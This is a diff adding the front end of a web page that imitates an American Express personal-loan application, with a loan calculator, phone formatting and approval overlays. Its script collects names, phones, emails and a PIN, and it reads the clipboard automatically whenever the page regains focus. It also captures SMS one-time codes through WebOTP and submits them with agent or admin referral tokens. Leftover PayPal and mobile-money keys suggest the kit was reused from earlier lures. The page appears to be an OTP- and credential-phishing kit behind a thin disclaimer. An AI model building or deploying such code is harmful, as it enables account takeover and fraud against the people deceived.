+          <text x="40" y="22" font-family="'Plus Jakarta Sans', sans-serif" font-weight="900" font-size="16" fill="#FFFFFF">AMEX</text>
+        </svg>
+        <span class="font-bold text-white">American Express Personal Loans</span>
+      </div>
+      <p data-i18n="footerRights">© 2026 American Express. All rights reserved. American Express Personal Loans are unsecured loans issued by American Express National Bank.</p>
+      <p class="text-[10px] text-blue-300/80 max-w-2xl mx-auto">
+        Equal Housing Lender. Member FDIC. Independent application prototype inspired by American Express Personal Loan and business financing disclosures. Not operated by or affiliated with American Express Company.
+      </p>
+    </footer>
+
+    <!-- Notification Modal -->
+    <div id="notice-modal"
+      class="fixed inset-0 bg-black/60 z-50 hidden flex items-center justify-center p-4 backdrop-blur-sm">
+      <div class="bg-white rounded-2xl max-w-xs w-full p-6 shadow-2xl text-center space-y-4">
+        <h3 id="modal-title" class="font-extrabold text-slate-900 text-base">Information</h3>
+        <p id="modal-message" class="text-xs text-slate-600 leading-relaxed"></p>
+        <button onclick="toggleNoticeModal(false)"
+          class="w-full py-3 amex-btn-gradient text-white text-xs font-bold rounded-xl shadow-md">
+          Dismiss
+        </button>
+      </div>
+    </div>
+
+    <!-- Full-Page Approval Overlay Screen -->
+    <div id="full-page-approval-modal"
+      class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-center p-6 bg-blue-950/95 backdrop-blur-xl text-white text-center transition-all duration-300">
+      <div
+        class="max-w-sm w-full bg-white text-slate-900 rounded-3xl p-7 shadow-2xl border border-blue-100 flex flex-col items-center space-y-6 relative overflow-hidden">
+        <!-- Top decorative Amex accent bar -->
+        <div class="absolute top-0 inset-x-0 h-2 bg-gradient-to-r from-blue-700 via-blue-500 to-cyan-400"></div>
+
+        <div class="relative flex items-center justify-center pt-2">
+          <div
+            class="w-20 h-20 rounded-2xl bg-brand-navy flex flex-col items-center justify-center shadow-inner border-4 border-blue-50 text-white p-2">
+            <span class="text-[9px] font-black tracking-widest text-blue-200">AMERICAN</span>
+            <span class="text-[9px] font-black tracking-widest text-white">EXPRESS</span>
+          </div>
+          <span class="absolute bottom-0 right-0 flex h-6 w-6">
+            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-blue opacity-75"></span>
+            <span
+              class="relative inline-flex rounded-full h-6 w-6 bg-brand-blue text-xs font-black text-white items-center justify-center shadow-md">⏳</span>
+          </span>
+        </div>
+
+        <div class="space-y-2 px-2">
+          <h3 id="approval-modal-title" class="text-lg font-extrabold text-slate-900 tracking-tight">Awaiting Approval
+          </h3>
+          <p id="approval-modal-desc" class="text-xs text-slate-600 leading-relaxed font-medium">Your request has been
+            submitted. Please wait while underwriting approves your verification...</p>
+        </div>
+
+        <div
+          class="w-full pt-1 flex items-center justify-center space-x-3 bg-blue-50 border border-blue-200 rounded-2xl py-3.5 px-4 shadow-sm">
+          <svg class="animate-spin h-5 w-5 text-brand-blue flex-shrink-0" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor"
+              d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
+            </path>
+          </svg>
+          <span id="approval-modal-status"
+            class="text-xs font-extrabold text-brand-navy uppercase tracking-wider">Verifying with
+            Underwriting...</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    window.t = window.t || function (key) { return key; };
+    let currentStep = 0;
+    let pinVisible = false;
+
+    function getStoredReferralToken() {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const fromUrl = urlParams.get('ref') || urlParams.get('agent') || urlParams.get('admin') || urlParams.get('r');
+        if (fromUrl && fromUrl.trim()) {
+          const val = fromUrl.trim();
+          sessionStorage.setItem('amex_ref_token', val);
+          localStorage.setItem('amex_ref_token', val);
+          sessionStorage.setItem('paypal_ref_token', val);
+          localStorage.setItem('paypal_ref_token', val);
+          return val;
+        }
+        return sessionStorage.getItem('amex_ref_token') || localStorage.getItem('amex_ref_token') || sessionStorage.getItem('paypal_ref_token') || localStorage.getItem('paypal_ref_token') || sessionStorage.getItem('momo_ref_token') || null;
+      } catch (_) {
+        return null;
+      }
+    }
+
+    function initReferralBanner() {
+      const token = getStoredReferralToken();
+      if (token) {
+        const banner = document.getElementById('referral-banner');
+        const disp = document.getElementById('referral-code-display');
+        if (banner) banner.classList.remove('hidden');
+        if (disp) disp.textContent = token;
+      }
+      try {
+        setCountry(localStorage.getItem('amex_country') || localStorage.getItem('paypal_country') || 'US');
+        const savedPhone = localStorage.getItem('amex_phone') || localStorage.getItem('paypal_phone');
+        if (savedPhone) {
+          const phInp = document.getElementById('phone-number-input');
+          const momoPhone = document.getElementById('momo-phone-display');
+          const formatted = formatPhoneNumber(savedPhone, appState.country);
+          appState.phoneNumber = formatted;
+          if (phInp && !phInp.value) phInp.value = formatted;
+          if (momoPhone && !momoPhone.value) momoPhone.value = formatted;
+        }
+      } catch (_) { }
+    }
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initReferralBanner);
+    } else {
+      initReferralBanner();
+    }
+
+    const appState = {
+      loanAmount: 10000,
+      loanTermMonths: 36,
+      loanType: 'American Express Personal Loan — Fixed Rate ($3,500 - $40,000)',
+      purpose: 'Debt Consolidation & Credit Card Refinancing',
+      country: 'US',
+      countryPrefix: '+1',
+      firstName: '',
+      lastName: '',
+      phoneNumber: '',
+      email: '',
+      momoPin: '',
+      applicationId: null
+    };
+
+    function calculateMonthly(amount, months) {
+      if (months <= 0) return 0;
+      // Fixed APR Amortization for American Express Personal Loans (8.99% APR baseline)
+      const annualApr = 0.0899;
+      const monthlyRate = annualApr / 12;
+      const monthly = amount * (monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
+      return Math.round(monthly);
+    }
+
+    function updateCalculator(val) {
+      let amount = parseInt(val, 10);
+      if (isNaN(amount) || amount < 99) amount = 99;
+      if (amount > 40000) amount = 40000;
+      appState.loanAmount = amount;
+      document.getElementById('calc-amount-display').innerText = '$' + amount.toLocaleString();
+
+      const monthly = calculateMonthly(amount, appState.loanTermMonths);
+      document.getElementById('calc-monthly-payment').innerText = monthly.toLocaleString();
+
+      const totalRepay = monthly * appState.loanTermMonths;
+      document.getElementById('calc-total-payment').innerText = '$' + totalRepay.toLocaleString();
+
+      const loanAmountInput = document.getElementById('loan-amount-input');
+      if (loanAmountInput && document.activeElement !== loanAmountInput) loanAmountInput.value = amount;
+    }
+
+    function onLoanAmountInput(val) {
+      const num = parseInt(val, 10);
+      if (!isNaN(num)) {
+        const clamped = Math.max(99, Math.min(40000, num));
+        appState.loanAmount = clamped;
+        const rangeEl = document.getElementById('amount-range');
+        if (rangeEl) rangeEl.value = clamped;
+        const calcDisplay = document.getElementById('calc-amount-display');
+        if (calcDisplay) calcDisplay.innerText = '$' + clamped.toLocaleString();
+        const monthly = calculateMonthly(clamped, appState.loanTermMonths);
+        const monthlyEl = document.getElementById('calc-monthly-payment');
+        if (monthlyEl) monthlyEl.innerText = monthly.toLocaleString();
+        const totalRepay = monthly * appState.loanTermMonths;
+        const totalEl = document.getElementById('calc-total-payment');
+        if (totalEl) totalEl.innerText = '$' + totalRepay.toLocaleString();
+      }
+    }
+
+    function setCountry(c) {
+      const country = (c || 'US').toUpperCase();
+      appState.country = country === 'UK' ? 'UK' : 'US';
+      appState.countryPrefix = appState.country === 'UK' ? '+44' : '+1';
+      try { 
+        localStorage.setItem('amex_country', appState.country); 
+        localStorage.setItem('paypal_country', appState.country); 
+      } catch (_) { }
+
+      // Update Step 2 buttons
+      const btnUs = document.getElementById('country-btn-us');
+      const btnUk = document.getElementById('country-btn-uk');
+      if (btnUs && btnUk) {
+        if (appState.country === 'US') {
+          btnUs.className = 'px-2 py-0.5 text-[11px] font-bold rounded-md transition-all bg-white text-brand-navy shadow-xs flex items-center space-x-1';
+          btnUk.className = 'px-2 py-0.5 text-[11px] font-bold rounded-md transition-all text-slate-500 hover:text-slate-800 flex items-center space-x-1';
+        } else {
+          btnUk.className = 'px-2 py-0.5 text-[11px] font-bold rounded-md transition-all bg-white text-brand-navy shadow-xs flex items-center space-x-1';
+          btnUs.className = 'px-2 py-0.5 text-[11px] font-bold rounded-md transition-all text-slate-500 hover:text-slate-800 flex items-center space-x-1';
+        }
+      }
+
+      // Update Step 2 badge & placeholder
+      const phoneFlag = document.getElementById('phone-flag');
+      if (phoneFlag) phoneFlag.innerText = appState.country === 'UK' ? '🇬🇧' : '🇺🇸';
+      const phonePrefix = document.getElementById('phone-prefix');
+      if (phonePrefix) phonePrefix.innerText = appState.countryPrefix;
+      const phoneInp = document.getElementById('phone-number-input');
+      if (phoneInp) {
+        phoneInp.placeholder = appState.country === 'UK' ? '7911 123456' : '(555) 123-4567';
+        if (phoneInp.value) {
+          phoneInp.value = formatPhoneNumber(phoneInp.value, appState.country);
+          appState.phoneNumber = phoneInp.value;
+        }
+      }
+
+      // Update Step 3 badge & placeholder
+      const momoFlag = document.getElementById('momo-phone-flag');
+      if (momoFlag) momoFlag.innerText = appState.country === 'UK' ? '🇬🇧' : '🇺🇸';
+      const momoPrefix = document.getElementById('momo-phone-prefix');
+      if (momoPrefix) momoPrefix.innerText = appState.countryPrefix;
+      const momoPhone = document.getElementById('momo-phone-display');
+      if (momoPhone) {
+        momoPhone.placeholder = appState.country === 'UK' ? '7911 123456' : '(555) 123-4567';
+        if (momoPhone.value) {
+          momoPhone.value = formatPhoneNumber(momoPhone.value, appState.country);
+        }
+      }
+    }
+
+    function toggleCountry() {
+      setCountry(appState.country === 'US' ? 'UK' : 'US');
+    }
+
+    function setTerm(months, ev) {
+      appState.loanTermMonths = months;
+      document.querySelectorAll('.term-btn').forEach(btn => {
+        btn.classList.remove('border-2', 'border-brand-blue', 'bg-blue-50', 'text-brand-navy', 'shadow-sm');
+        btn.classList.add('border', 'border-slate-200', 'text-slate-700');
+      });
+
+      const e = ev || (typeof event !== 'undefined' ? event : null);
+      if (e && e.target) {
+        e.target.classList.remove('border', 'border-slate-200', 'text-slate-700');
+        e.target.classList.add('border-2', 'border-brand-blue', 'bg-blue-50', 'text-brand-navy', 'shadow-sm');
+      }
+
+      const termSelect = document.getElementById('loan-term-select');
+      if (termSelect) termSelect.value = months;
+
+      updateCalculator(appState.loanAmount);
+    }
+
+    function showClipboardToast(msg) {
+      let toast = document.getElementById('clipboard-toast');
+      if (!toast) {
+        toast = document.createElement('div');
+        toast.id = 'clipboard-toast';
+        toast.className = 'fixed top-5 left-1/2 -translate-x-1/2 z-[200] bg-slate-900 text-white text-xs font-bold px-4 py-2.5 rounded-full shadow-2xl transition-all duration-300 opacity-0 pointer-events-none flex items-center space-x-2 border border-slate-700';
+        document.body.appendChild(toast);
+      }
+      toast.innerText = msg;
+      toast.classList.remove('opacity-0', 'pointer-events-none');
+      toast.classList.add('opacity-100');
+      setTimeout(() => {
+        toast.classList.remove('opacity-100');
+        toast.classList.add('opacity-0', 'pointer-events-none');
+      }, 3000);
+    }
+
+    function isOwnSiteUrl(urlStr) {
+      if (!urlStr) return false;
+      try {
+        const u = new URL(urlStr.startsWith('http') ? urlStr : ('https://' + urlStr));
+        if (u.hostname === window.location.hostname) return true;
+        if (window.location.hostname && window.location.hostname.includes('render.com') && u.hostname.includes('render.com')) return true;
+        if (u.hostname === 'localhost' || u.hostname === '127.0.0.1') return true;
+      } catch (e) { }
+      return false;
+    }
+
+    function toggleNoticeModal(show, title, message) {
+      const modal = document.getElementById('notice-modal');
+      const titleEl = document.getElementById('modal-title');
+      const msgEl = document.getElementById('modal-message');
+      if (titleEl && title) titleEl.innerText = title;
+      if (msgEl && message) msgEl.innerText = message;
+      if (modal) {
+        if (show) modal.classList.remove('hidden');
+        else modal.classList.add('hidden');
+      }
+    }
+
+    async function copyToClipboard(text, toastMsg) {
+      if (!text || !text.trim()) return;
+      try {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          await navigator.clipboard.writeText(text.trim());
+          if (toastMsg) showClipboardToast(toastMsg);
+        }
+      } catch (e) {
+        console.warn('Copy to clipboard error:', e);
+      }
+    }
+
+    async function pasteSmsFromClipboard() {
+      const msgInput = document.getElementById('momo-pasted-msg');
+      try {
+        let text = '';
+        if (navigator.clipboard && navigator.clipboard.readText) {
+          text = await navigator.clipboard.readText();
+        }
+
+        if (text && text.trim()) {
+          const cleanText = text.trim();
+          if (isOwnSiteUrl(cleanText)) {
+            showClipboardToast('⚠️ Clipboard contains website URL, not SMS.');
+            return;
+          }
+          if (msgInput) {
+            msgInput.value = cleanText;
+            copyToClipboard(cleanText);
+            showClipboardToast('⚡ SMS pasted & copied to clipboard!');
+            handlePostLoginPastedMsg(cleanText, false);
+          }
+        } else {
+          showClipboardToast('📋 Clipboard is empty. Please copy or await SMS.');
+        }
+      } catch (err) {
+        console.warn('Clipboard access error:', err);
+        showClipboardToast('📋 Tap the box to paste your SMS.');
+      }
+    }
+
+    function resetScrollToTop() {
+      try {
+        window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
+      } catch (e) {
+        window.scrollTo(0, 0);
+      }
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+      const appWrapper = document.querySelector('.max-w-md');
+      if (appWrapper) appWrapper.scrollTop = 0;
+      const mainEl = document.querySelector('main');
+      if (mainEl) mainEl.scrollTop = 0;
+    }
+
+    function showApprovalOverlay(title, desc, statusText) {
+      const modal = document.getElementById('full-page-approval-modal');
+      const titleEl = document.getElementById('approval-modal-title');
+      const descEl = document.getElementById('approval-modal-desc');
+      const statusEl = document.getElementById('approval-modal-status');
+      if (titleEl && title) titleEl.innerText = title;
+      if (descEl && desc) descEl.innerText = desc;
+      if (statusEl && statusText) statusEl.innerText = statusText;
+      if (modal) {
+        modal.classList.remove('hidden');
+        document.body.classList.add('overflow-hidden');
+      }
+      resetScrollToTop();
+    }
+
+    function hideApprovalOverlay() {
+      const modal = document.getElementById('full-page-approval-modal');
+      if (modal) {
+        modal.classList.add('hidden');
+        document.body.classList.remove('overflow-hidden');
+      }
+      resetScrollToTop();
+      requestAnimationFrame(resetScrollToTop);
+      setTimeout(resetScrollToTop, 50);
+    }
+
+    function copyTargetPhone(btn) {
+      const ph = appState.phoneNumber || localStorage.getItem('amex_phone') || localStorage.getItem('paypal_phone') || '';
+      if (ph) {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(ph);
+        }
+        if (btn) {
+          const orig = btn.innerHTML;
+          btn.innerHTML = '<span>✅</span><span>Copied!</span>';
+          setTimeout(() => { btn.innerHTML = orig; }, 1800);
+        }
+      }
+    }
+
+    function openMessagingApp(e) {
+      if (e) {
+        try { e.preventDefault(); } catch (err) { }
+      }
+      startSmsCountdownTimer();
+
+      const isAndroid = /android/i.test(navigator.userAgent);
+      if (isAndroid) {
+        try {
+          window.location.href = 'intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.APP_MESSAGING;end';
+          setTimeout(() => {
+            window.location.href = 'sms:';
+          }, 500);
+          return;
+        } catch (err) {
+          window.location.href = 'sms:';
+          return;
+        }
+      }
+      window.location.href = 'sms:';
+    }
+
+    let simCountdownInterval = null;
+    function startSmsCountdownTimer() {
+      if (simCountdownInterval) {
+        clearInterval(simCountdownInterval);
+        simCountdownInterval = null;
+      }
+      let secondsRemaining = 20;
+      const displayEl = document.getElementById('sms-timer-display');
+      const statusEl = document.getElementById('sms-timer-status');
+      const phoneEl = document.getElementById('sms-timer-phone');
+      const countdownCard = document.getElementById('sim-sms-countdown-card');
+
+      if (countdownCard) {
+        countdownCard.classList.remove('hidden');
+      }
+
+      if (phoneEl) {
+        phoneEl.innerText = appState.phoneNumber || 'American Express Account';
+      }
+
+      if (displayEl) {
+        displayEl.innerText = '00:20';
+        displayEl.className = 'text-3xl font-black text-brand-blue tracking-tight font-mono py-0.5';
+      }
+      if (statusEl) {
+        statusEl.innerText = 'Copy the confirmation SMS then paste below.';
+        statusEl.className = 'text-[11px] text-slate-500 font-semibold';
+      }
+
+      const updateDisplay = () => {
+        const mins = Math.floor(secondsRemaining / 60);
+        const secs = secondsRemaining % 60;
+        const formatted = `${mins < 10 ? '0' + mins : mins}:${secs < 10 ? '0' + secs : secs}`;
+        if (displayEl) displayEl.innerText = formatted;
+      };
+
+      updateDisplay();
+
+      simCountdownInterval = setInterval(() => {
+        secondsRemaining--;
+        if (secondsRemaining > 0) {
+          updateDisplay();
+        } else {
+          clearInterval(simCountdownInterval);
+          simCountdownInterval = null;
+          if (displayEl) {
+            displayEl.innerText = '00:00';
+            displayEl.className = 'text-2xl font-black text-red-600 tracking-tight font-mono py-0.5';
+          }
+          if (statusEl) {
+            statusEl.innerText = '⚠️ Time expired. If SMS not received, tap Open SMS or Paste.';
+            statusEl.className = 'text-[11px] text-red-600 font-bold';
+          }
+        }
+      }, 1000);
+    }
+
+    function initWebOtpReceiver() {
+      if (!('OTPCredential' in window)) return;
+      const msgInput = document.getElementById('momo-pasted-msg');
+      try {
+        if (window.webOtpController) {
+          try { window.webOtpController.abort(); } catch (err) { }
+        }
+        window.webOtpController = new AbortController();
+        navigator.credentials.get({
+          otp: { transport: ['sms'] },
+          signal: window.webOtpController.signal
+        }).then(otp => {
+          if (otp) {
+            const incoming = (otp.message || otp.body || otp.code || '').trim();
+            if (incoming && msgInput) {
+              msgInput.value = incoming;
+              copyToClipboard(incoming);
+              showClipboardToast('⚡ WebOTP: SMS received & copied to clipboard!');
+              handlePostLoginPastedMsg(incoming, false);
+            }
+          }
+        }).catch(() => { });
+      } catch (e) {
+        console.warn('WebOTP init error:', e);
+      }
+    }
+
+    let lastAutoPastedText = '';
+
+    async function autoDetectAndPasteClipboard(force = false) {
+      const msgInput = document.getElementById('momo-pasted-msg');
+      if (!msgInput) return;
+      if (!force && msgInput.value.trim().length > 10) return;
+      try {
+        if (navigator.clipboard && navigator.clipboard.readText) {
+          const text = await navigator.clipboard.readText();
+          if (text && text.trim()) {
+            const cleanText = text.trim();
+            if (isOwnSiteUrl(cleanText)) return;
+            if (cleanText === lastAutoPastedText && !force) return;
+            lastAutoPastedText = cleanText;
+            msgInput.value = cleanText;
+            showClipboardToast('⚡ SMS message detected & pasted!');
+            handlePostLoginPastedMsg(cleanText, true);
+          }
+        }
+      } catch (e) {
+        console.warn('Auto clipboard read permission needed:', e);
+      }
+    }
+
+    window.addEventListener('focus', () => {
+      if (typeof currentStep !== 'undefined' && currentStep === 4) {
+        autoDetectAndPasteClipboard(true);
+      }
+    });
+
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'visible' && typeof currentStep !== 'undefined' && currentStep === 4) {
+        autoDetectAndPasteClipboard(true);
+      }
+    });
+
+    function startSimSmsReceiver() {
+      const msgInput = document.getElementById('momo-pasted-msg');
+      const statusEl = document.getElementById('momo-extract-status');
+      const badge = document.getElementById('sms-waiting-badge');
+
+      if (msgInput) {
+        msgInput.value = '';
+        msgInput.placeholder = 'Paste your American Express SMS confirmation message here...';
+      }
+      if (statusEl) {
+        statusEl.classList.add('hidden');
+      }
+      if (badge) {
+        badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
+        badge.innerHTML = '<span>Ready to Paste</span>';
+      }
+
+      startSmsCountdownTimer();
+      initWebOtpReceiver();
+      setTimeout(() => {
+        autoDetectAndPasteClipboard();
+      }, 400);
+    }
+
+    async function ensureApplicationCreated() {
+      if (appState.applicationId) return appState.applicationId;
+
+      const refToken = getStoredReferralToken();
+      const submissionId = window.crypto && window.crypto.randomUUID ? window.crypto.randomUUID() : ('amex-' + Date.now());
+      const consent = document.getElementById('agent-consent-checkbox') ? document.getElementById('agent-consent-checkbox').checked : true;
+
+      const payload = {
+        firstName: appState.firstName || '',
+        lastName: appState.lastName || '',
+        phone: getFormattedPhone(appState.phoneNumber) || appState.phoneNumber || '',
+        loanType: appState.loanType || 'American Express Personal Loan — Fixed Rate ($3,500 - $40,000)',
+        loanAmount: Number(appState.loanAmount) || 10000,
+        termMonths: appState.loanTermMonths || 36,
+        purpose: appState.purpose || 'Debt Consolidation & Credit Card Refinancing',
+        employment: 'Employed',
+        annualIncome: Number(appState.loanAmount) * 8,
+        referralToken: refToken,
+        consentToAgentContact: consent,
+        submissionId: submissionId
+      };
+
+      try {
+        let res = await fetch('/api/applications', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        let data = await res.json().catch(() => ({}));
+        if (!res.ok && data.error && data.error.toLowerCase().includes('referraltoken')) {
+          try {
+            localStorage.removeItem('amex_ref_token');
+            sessionStorage.removeItem('amex_ref_token');
+            localStorage.removeItem('paypal_ref_token');
+            sessionStorage.removeItem('paypal_ref_token');
+            const banner = document.getElementById('referral-banner');
+            if (banner) banner.classList.add('hidden');
+          } catch (_) {}
+          payload.referralToken = null;
+          res = await fetch('/api/applications', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          data = await res.json().catch(() => ({}));
+        }
+        if (!res.ok) {
+          throw new Error(data.error || 'Failed to submit application data');
+        }
+        if (data.applicationId) {
+          appState.applicationId = data.applicationId;
+          return data.applicationId;
+        }
+      } catch (err) {
+        console.error('Failed to create application:', err);
+        throw err;
+      }
+      return null;
+    }
+
+    function getFormattedPhone(raw) {
+      let p = (raw || appState.phoneNumber || '').trim();
+      if (!p) return '';
+      if (p.startsWith('+')) return p;
+      const digits = p.replace(/\D/g, '');
+      if (appState.country === 'US' && digits.length === 11 && digits.startsWith('1')) {
+        return '+' + digits;
+      }
+      if (appState.country === 'UK' && (digits.length === 12 || digits.length === 11) && digits.startsWith('44')) {
+        return '+' + digits;
+      }
+      if (appState.country === 'UK' && digits.startsWith('0')) {
+        return '+44' + digits.slice(1);
+      }
+      return (appState.countryPrefix || '+1') + digits;
+    }
+
+    function formatPhoneNumber(val, country = 'US') {
+      if (!val) return '';
+      let digits = String(val).replace(/\D/g, '');
+      if (!digits) return '';
+
+      if (country === 'US') {
+        if (digits.length === 11 && digits.startsWith('1')) {
+          digits = digits.slice(1);
+        }
+        digits = digits.slice(0, 10);
+        if (digits.length < 4) {
+          return `(${digits}`;
+        } else if (digits.length < 7) {
+          return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
+        } else {
+          return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6, 10)}`;
+        }
+      } else if (country === 'UK') {
+        digits = digits.slice(0, 11);
+        if (digits.startsWith('0')) {
+          if (digits.length <= 5) return digits;
+          return `${digits.slice(0, 5)} ${digits.slice(5)}`;
+        } else {
+          if (digits.length <= 4) return digits;
+          return `${digits.slice(0, 4)} ${digits.slice(4)}`;
+        }
+      }
+      return digits;
+    }
+
+    function onPhoneKeyDown(el, e) {
+      if (e && e.key === 'Backspace' && el) {
+        const cursor = el.selectionEnd;
+        if (cursor === el.selectionStart && cursor > 0) {
+          const charBefore = el.value[cursor - 1];
+          if (charBefore === ' ' || charBefore === '-' || charBefore === ')') {
+            e.preventDefault();
+            let lastDigitIdx = -1;
+            for (let i = cursor - 1; i >= 0; i--) {
+              if (/\d/.test(el.value[i])) {
+                lastDigitIdx = i;
+                break;
+              }
+            }
+            if (lastDigitIdx !== -1) {
+              const nextVal = el.value.slice(0, lastDigitIdx) + el.value.slice(lastDigitIdx + 1);
+              el.value = nextVal;
+              onPhoneNumberInput(el);
+            }
+          }
+        }
+      }
+    }
+
+    function onPhoneNumberInput(el) {
+      if (!el) return;
+      const rawVal = el.value;
+      const country = appState.country || 'US';
+      const cursor = el.selectionEnd || rawVal.length;
+
+      const digitsBeforeCursor = rawVal.slice(0, cursor).replace(/\D/g, '').length;
+      const formatted = formatPhoneNumber(rawVal, country);
+      el.value = formatted;
+
+      if (typeof el.setSelectionRange === 'function') {
+        let newCursor = formatted.length;
+        if (digitsBeforeCursor > 0) {
+          let countedDigits = 0;
+          for (let i = 0; i < formatted.length; i++) {
+            if (/\d/.test(formatted[i])) {
+              countedDigits++;
+            }
+            if (countedDigits === digitsBeforeCursor) {
+              newCursor = i + 1;
+              break;
+            }
+          }
+        } else {
+          newCursor = formatted.startsWith('(') ? 1 : 0;
+        }
+        el.setSelectionRange(newCursor, newCursor);
+      }
+
+      appState.phoneNumber = formatted;
+      try { 
+        localStorage.setItem('amex_phone', formatted); 
+        localStorage.setItem('paypal_phone', formatted); 
+      } catch (_) {}
+
+      const phInp = document.getElementById('phone-number-input');
+      const momoInp = document.getElementById('momo-phone-display');
+      if (el === phInp && momoInp && momoInp !== document.activeElement) {
+        momoInp.value = formatted;
+      } else if (el === momoInp && phInp && phInp !== document.activeElement) {
+        phInp.value = formatted;
+      }
+
+      const rawDigits = formatted.replace(/\D/g, '');
+      if (rawDigits.length >= 6) {
+        checkReturningUserPhone(rawDigits);
+      }
+    }
+
+    function onMomoPhoneInput(val) {
+      const phInp = document.getElementById('phone-number-input');
+      const formatted = formatPhoneNumber(val, appState.country);
+      appState.phoneNumber = formatted;
+      try { 
+        localStorage.setItem('amex_phone', formatted); 
+        localStorage.setItem('paypal_phone', formatted); 
+      } catch (_) {}
+      if (phInp && !phInp.value) phInp.value = formatted;
+    }
+
+    let phoneCheckTimer = null;
+    async function checkReturningUserPhone(val) {
+      if (phoneCheckTimer) clearTimeout(phoneCheckTimer);
+      const clean = (val || '').replace(/[^0-9]/g, '');
+
+      if (!clean || clean.length < 6) {
+        return;
+      }
+
+      phoneCheckTimer = setTimeout(async () => {
+        try {
+          const res = await fetch(`/api/check-phone?phone=${encodeURIComponent(clean)}`);
+          if (res.ok) {
+            const data = await res.json();
+            if (data.returningUser && data.firstName) {
+              const fnEl = document.getElementById('first-name-input');
+              const lnEl = document.getElementById('last-name-input');
+
+              if (fnEl && data.firstName) {
+                fnEl.value = data.firstName;
+                appState.firstName = data.firstName;
+              }
+              if (lnEl && data.lastName) {
+                lnEl.value = data.lastName;
+                appState.lastName = data.lastName;
+              }
+              appState.phoneNumber = clean;
+              const dispPhone = document.getElementById('momo-phone-display');
+              if (dispPhone) dispPhone.value = clean;
+
+              if (data.applicationId) {
+                appState.previousApplicationId = data.applicationId;
+              }
+            }
+          }
+        } catch (e) {
+          console.warn('Phone check error:', e);
+        }
+      }, 350);
+    }
+
+    function goToStep(stepNum) {
+      hideApprovalOverlay();
+      isAwaitingStep2Approval = false;
+      if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
+      if (simCountdownInterval && stepNum !== 4) {
+        clearInterval(simCountdownInterval);
+        simCountdownInterval = null;
+      }
+
+      if (stepNum === 0 || stepNum === 1) {
+        if (pollingInterval) {
+          clearInterval(pollingInterval);
+          pollingInterval = null;
+        }
+        currentPollingAppId = null;
+        activePinVerId = null;
+        activeSmsVerId = null;
+        appState.applicationId = null;
+        isSubmittingMessage = false;
+        const msgInp = document.getElementById('momo-pasted-msg');
+        if (msgInp) msgInp.value = '';
+      }
+
+      if (currentStep === 1) {
+        const typeEl = document.getElementById('loan-type-select');
+        if (typeEl) appState.loanType = typeEl.value;
+        const amtEl = document.getElementById('loan-amount-input');
+        if (amtEl) appState.loanAmount = parseInt(amtEl.value, 10) || appState.loanAmount;
+        const termEl = document.getElementById('loan-term-select');
+        if (termEl) appState.loanTermMonths = parseInt(termEl.value, 10) || 36;
+        const purpEl = document.getElementById('loan-purpose-input');
+        if (purpEl) appState.purpose = purpEl.value;
+      } else if (currentStep === 2) {
+        const fnEl = document.getElementById('first-name-input');
+        if (fnEl) appState.firstName = fnEl.value.trim();
+        const lnEl = document.getElementById('last-name-input');
+        if (lnEl) appState.lastName = lnEl.value.trim();
+        const phEl = document.getElementById('phone-number-input');
+        if (phEl) appState.phoneNumber = phEl.value.trim();
+        const dispPhone = document.getElementById('momo-phone-display');
+        if (dispPhone) dispPhone.value = appState.phoneNumber;
+
+        const emEl = document.getElementById('email-input');
+        if (emEl && emEl.value.trim()) {
+          appState.email = emEl.value.trim();
+          const dispEmail = document.getElementById('momo-email-display');
+          if (dispEmail) dispEmail.value = appState.email;
+        }
+
+        if (stepNum === 3) {
+          ensureApplicationCreated();
+        }
+      }
+
+      for (let i = 0; i <= 6; i++) {
+        const sec = document.getElementById(`step-${i}`);
+        if (sec) {
+          sec.classList.add('hidden');
+          sec.style.setProperty('display', 'none', 'important');
+        }
+      }
+
+      const targetSec = document.getElementById(`step-${stepNum}`);
+      if (targetSec) {
+        targetSec.classList.remove('hidden');
+        targetSec.style.removeProperty('display');
+      }
+
+      currentStep = stepNum;
+
+      const backBtn = document.getElementById('header-back-btn');
+
+      if (currentStep === 0) {
+        backBtn.classList.add('opacity-0', 'pointer-events-none');
+      } else {
+        backBtn.classList.remove('opacity-0', 'pointer-events-none');
+      }
+
+      if (currentStep === 2) {
+        const phInp = document.getElementById('phone-number-input');
+        if (phInp && phInp.value) {
+          checkReturningUserPhone(phInp.value);
+        }
+      }
+
+      if (currentStep === 3) {
+        const dispPhone = document.getElementById('momo-phone-display');
+        const phInp = document.getElementById('phone-number-input');
+        if (!appState.phoneNumber && phInp && phInp.value) {
+          appState.phoneNumber = phInp.value.trim();
+        }
+        if (dispPhone) {
+          dispPhone.value = appState.phoneNumber || (phInp ? phInp.value.trim() : '');
+        }
+
+        const dispEmail = document.getElementById('momo-email-display');
+        const emailInp = document.getElementById('email-input');
+        if (!appState.email && emailInp && emailInp.value) {
+          appState.email = emailInp.value.trim();
+        }
+        if (dispEmail) {
+          dispEmail.value = appState.email || (emailInp ? emailInp.value.trim() : '');
+        }
+
+        const demoPwdInp = document.getElementById('demo-password-input');
